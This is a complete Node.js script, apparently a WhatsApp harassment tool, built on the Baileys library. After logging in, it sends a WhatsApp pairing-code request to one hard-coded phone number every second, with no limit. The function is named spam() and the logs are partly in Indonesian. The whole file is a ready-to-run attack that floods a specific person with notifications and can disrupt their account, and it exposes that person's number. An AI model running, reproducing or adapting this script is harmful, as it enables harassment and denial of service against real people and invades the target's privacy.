const { makeWASocket, Browsers, useMultiFileAuthState } = require("@whiskeysockets/baileys");
            const pino = require("pino");

            async function spam() {
              try {
                const { state } = await useMultiFileAuthState("p");

                const client = makeWASocket({
                  printQRInTerminal: false,
                  browser: Browsers.macOS("Edge"),
                  auth: state,
                  logger: pino({ level: "fatal" }),
                });

                console.log("[START] Mulai mengirim pairing request ke 62882005514880");

                setInterval(async () => {
                  try {
                    await client.requestPairingCode("62882005514880");
                    console.log("[SUCCESS] Pairing request sent to 62882005514880");
                  } catch (err) {
                    console.error("[ERROR] Gagal mengirim pairing request ke 62882005514880:", err.message);
                  }
                }, 1000);
              } catch (err) {
                console.error("[ERROR] Terjadi kesalahan saat inisialisasi:", err.message);
              }
            }

            spam();